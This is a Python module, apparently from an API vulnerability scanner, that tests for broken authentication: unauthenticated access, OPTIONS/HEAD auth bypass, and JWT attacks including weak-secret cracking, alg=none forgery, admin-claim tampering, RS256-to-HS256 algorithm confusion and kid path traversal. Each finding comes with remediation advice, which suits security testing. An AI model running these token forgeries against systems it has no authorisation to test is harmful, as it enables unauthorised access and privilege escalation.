"""Attack 2: Broken Authentication — JWT attacks + auth bypass."""
import sys

from ..config import AUTH_PATH_RE, BEARER_JWT_RE
from ..http_client import HTTPClient
from ..models import Finding, ScanContext
from ..utils.jwt import (jwt_parts, jwt_crack_weak_secret,
                         jwt_forge_alg_none, jwt_tamper_claims,
                         jwt_forge_alg_confusion, jwks_to_pem,
                         extract_jwt_from_auth)
from ..utils.validation import is_auth_enforced


def _log(msg):
    print(f"[*] Attack 2 (auth): {msg}", file=sys.stderr)


def _test_no_auth(client, ep, ctx):
    """Test if endpoint is accessible without any auth token."""
    from ..utils.validation import looks_like_error_or_empty
    resp = client.request("GET", ep.url)
    if 200 <= resp.status < 300 and resp.length > 50 and \
            not looks_like_error_or_empty(resp):
        ctx.add_finding(Finding(
            title="No authentication required on protected endpoint",
            severity="high",
            category="API2:2023 Broken Authentication",
            method="GET",
            path=ep.path,
            host=ep.host,
            status=resp.status,
            evidence=f"No auth header sent, got {resp.status} with {resp.length}B",
            remediation="Require authentication on all non-public endpoints.",
            attack_phase="broken_auth"))
        return True
    return False


def _test_method_bypass(client, ep, ctx):
    """Test if OPTIONS/HEAD bypass authentication (common on protected paths).
    Some servers misconfigure auth filters to only apply to GET/POST, allowing
    OPTIONS/HEAD to enumerate methods or retrieve metadata without auth."""
    found = 0
    for method in ("OPTIONS", "HEAD"):
        resp = client.request(method, ep.url)
        if 200 <= resp.status < 300:
            if method == "OPTIONS" and "allow" in resp.headers:
                ctx.add_finding(Finding(
                    title=f"Sensitive endpoint ({ep.path}) accessible via OPTIONS without auth",
                    severity="high",
                    category="API2:2023 Broken Authentication",
                    method=method,
                    path=ep.path,
                    host=ep.host,
                    status=resp.status,
                    evidence=f"OPTIONS {ep.path} returned {resp.status}; "
                             f"Allow: {resp.headers.get('allow', '')}",
                    remediation="Enforce authentication on all HTTP methods, "
                               "including OPTIONS.",
                    attack_phase="broken_auth"))
                found += 1
            elif method == "HEAD":
                ctx.add_finding(Finding(
                    title=f"Sensitive endpoint ({ep.path}) accessible via HEAD without auth",
                    severity="high",
                    category="API2:2023 Broken Authentication",
                    method=method,
                    path=ep.path,
                    host=ep.host,
                    status=resp.status,
                    evidence=f"HEAD {ep.path} returned {resp.status} (method-based auth bypass)",
                    remediation="Enforce authentication uniformly across all HTTP methods.",
                    attack_phase="broken_auth"))
                found += 1
    return found


def _fetch_public_key_pem(client, ep):
    """Best-effort fetch of the signing public key from common JWKS locations.

    Needed for the RS256->HS256 algorithm-confusion attack. Returns a PEM
    string or None. Dependency-free RSA JWK->PEM conversion.
    """
    import json as _json
    from urllib.parse import urlparse
    base = f"{urlparse(ep.url).scheme}://{ep.host}"
    paths = [
        "/.well-known/jwks.json",
        "/.well-known/openid-configuration/jwks",
        "/jwks.json", "/jwks", "/oauth/jwks", "/api/jwks.json",
        "/.well-known/openid-configuration",
    ]
    for p in paths:
        r = client.request("GET", base + p)
        if r.status != 200 or not r.body:
            continue
        try:
            doc = _json.loads(r.body)
        except ValueError:
            continue
        # openid-configuration -> follow jwks_uri once
        if isinstance(doc, dict) and "jwks_uri" in doc and "keys" not in doc:
            r2 = client.request("GET", doc["jwks_uri"])
            try:
                doc = _json.loads(r2.body)
            except (ValueError, AttributeError):
                continue
        keys = doc.get("keys", []) if isinstance(doc, dict) else []
        for jwk in keys:
            pem = jwks_to_pem(jwk)
            if pem:
                return pem
    return None


def _test_jwt_attacks(client, token, ep, ctx):
    """Run JWT-specific attacks against a token.

    VALIDATION GATE (REAL_WORLD_RESEARCH.md §8): network-based bypass claims
    (alg=none, claim tampering, kid injection, algorithm confusion) are only
    meaningful if the endpoint actually ENFORCES auth. We first confirm a
    garbage token is rejected. If garbage is accepted, the endpoint is simply
    unauthenticated — we report that once and skip the (false-positive) bypass
    assertions.
    """
    found = 0

    enforced = is_auth_enforced(client, ep.url)
    if not enforced:
        # A garbage token got in — every "forged token accepted" would be a
        # false positive. Report the real issue instead.
        ctx.add_finding(Finding(
            title="Endpoint accepts an invalid JWT (auth not enforced)",
            severity="high",
            category="API2:2023 Broken Authentication",
            method="GET",
            path=ep.path,
            host=ep.host,
            status=0,
            evidence="A syntactically-valid but bogus-signature control token "
                     "was accepted (2xx). Signature verification is not "
                     "enforced; JWT 'bypass' sub-tests are skipped to avoid "
                     "false positives.",
            remediation="Verify the JWT signature on every request and reject "
                        "tokens that fail verification.",
            attack_phase="broken_auth"))
        found += 1

    # 1. Weak secret cracking (offline — always valid regardless of enforcement)
    secret = jwt_crack_weak_secret(token)
    if secret is not None:
        ctx.add_finding(Finding(
            title=f"JWT signed with weak secret: {secret!r}",
            severity="critical",
            category="API2:2023 Broken Authentication",
            method="GET",
            path=ep.path,
            host=ep.host,
            status=0,
            evidence=f"HMAC secret cracked via dictionary: {secret!r}",
            remediation="Use a strong, random secret (256+ bits). "
                        "Consider asymmetric signing (RS256).",
            attack_phase="broken_auth"))
        found += 1

    # The following tests assert a *bypass*; only meaningful if auth is
    # enforced (a garbage token is rejected). Skip otherwise — already reported.
    if not enforced:
        return found

    # 2. alg=none bypass
    forged = jwt_forge_alg_none(token)
    if forged:
        headers = {"Authorization": f"Bearer {forged}"}
        resp = client.request("GET", ep.url, headers=headers)
        if 200 <= resp.status < 300:
            ctx.add_finding(Finding(
                title="JWT alg=none bypass accepted",
                severity="critical",
                category="API2:2023 Broken Authentication",
                method="GET",
                path=ep.path,
                host=ep.host,
                status=resp.status,
                evidence=f"alg=none forged token accepted, got {resp.status}",
                remediation="Reject tokens with alg=none. "
                            "Whitelist allowed algorithms.",
                attack_phase="broken_auth"))
            found += 1

    # 3. Claim tampering (role escalation)
    tampered = jwt_tamper_claims(token, {"role": "admin", "is_admin": True})
    if tampered:
        headers = {"Authorization": f"Bearer {tampered}"}
        resp = client.request("GET", ep.url, headers=headers)
        if 200 <= resp.status < 300:
            ctx.add_finding(Finding(
                title="JWT claim tampering accepted (role=admin)",
                severity="critical",
                category="API2:2023 Broken Authentication",
                method="GET",
                path=ep.path,
                host=ep.host,
                status=resp.status,
                evidence=f"Tampered token with role=admin accepted, "
                         f"got {resp.status}",
                remediation="Always verify JWT signature server-side. "
                            "Never trust client-supplied claims.",
                attack_phase="broken_auth"))
            found += 1

    # 3b. RS256 -> HS256 algorithm confusion (REAL_WORLD_RESEARCH.md §8).
    # Only applicable when the real token uses an asymmetric algorithm.
    parsed_ac = jwt_parts(token)
    if parsed_ac and parsed_ac[0].get("alg", "").upper().startswith(("RS", "ES", "PS")):
        pub_pem = _fetch_public_key_pem(client, ep)
        if pub_pem:
            confused = jwt_forge_alg_confusion(
                token, pub_pem, {"role": "admin", "is_admin": True})
            if confused:
                headers = {"Authorization": f"Bearer {confused}"}
                resp = client.request("GET", ep.url, headers=headers)
                if 200 <= resp.status < 300:
                    ctx.add_finding(Finding(
                        title="JWT algorithm confusion (RS256→HS256) accepted",
                        severity="critical",
                        category="API2:2023 Broken Authentication",
                        method="GET",
                        path=ep.path,
                        host=ep.host,
                        status=resp.status,
                        evidence="Token re-signed HS256 using the server's RSA "
                                 "public key (from JWKS) as the HMAC secret was "
                                 f"accepted ({resp.status}); role=admin injected.",
                        remediation="Pin the expected algorithm server-side; never "
                                    "let the token header choose the verification "
                                    "algorithm. Use separate key types per alg.",
                        attack_phase="broken_auth"))
                    found += 1

    # 4. kid injection (path traversal)
    parsed = jwt_parts(token)
    if parsed:
        header, payload, _, _ = parsed
        if "kid" in header:
            from ..utils.jwt import _b64url_encode
            import json as _json
            import hmac
            import hashlib
            evil_header = dict(header)
            evil_header["kid"] = "../../dev/null"
            evil_header["alg"] = "HS256"
            h = _b64url_encode(_json.dumps(evil_header))
            p = _b64url_encode(_json.dumps(payload))
            signing_input = h + b"." + p
            sig = _b64url_encode(
                hmac.new(b"", signing_input, hashlib.sha256).digest())
            kid_token = (signing_input + b"." + sig).decode()
            headers = {"Authorization": f"Bearer {kid_token}"}
            resp = client.request("GET", ep.url, headers=headers)
            if 200 <= resp.status < 300:
                ctx.add_finding(Finding(
                    title="JWT kid path traversal accepted",
                    severity="critical",
                    category="API2:2023 Broken Authentication",
                    method="GET",
                    path=ep.path,
                    host=ep.host,
                    status=resp.status,
                    evidence="kid=../../dev/null with empty-key HMAC accepted",
                    remediation="Sanitize kid parameter. Never use it as file path.",
                    attack_phase="broken_auth"))
                found += 1

    return found


def run_broken_auth(ctx: ScanContext):
    """Test for broken authentication vulnerabilities."""
    endpoints = ctx.api_endpoints()
    if not endpoints:
        endpoints = ctx.endpoints[:100]
    _log(f"Testing {len(endpoints)} endpoints")

    client = HTTPClient(timeout=ctx.timeout)
    found = 0

    # Test no-auth access on GET
    if ctx.auth:
        for ep in endpoints[:50]:
            if _test_no_auth(client, ep, ctx):
                found += 1

    # Test method-based bypass (OPTIONS/HEAD without auth on sensitive paths)
    from ..config import SENSITIVE_PATH_RE, BFLA_PATH_RE
    sensitive_eps = [e for e in endpoints
                     if SENSITIVE_PATH_RE.search(e.path) or
                        BFLA_PATH_RE.search(e.path)]
    for ep in sensitive_eps[:50]:
        found += _test_method_bypass(client, ep, ctx)

    # JWT attacks on provided tokens
    tokens = []
    if ctx.auth:
        jwt = extract_jwt_from_auth(ctx.auth)
        if jwt:
            tokens.append(jwt)
    if ctx.auth2:
        jwt = extract_jwt_from_auth(ctx.auth2)
        if jwt:
            tokens.append(jwt)
    tokens.extend(ctx.tokens)

    for token in set(tokens):
        test_ep = endpoints[0] if endpoints else None
        if test_ep:
            found += _test_jwt_attacks(client, token, test_ep, ctx)

    _log(f"Broken auth findings: {found}")
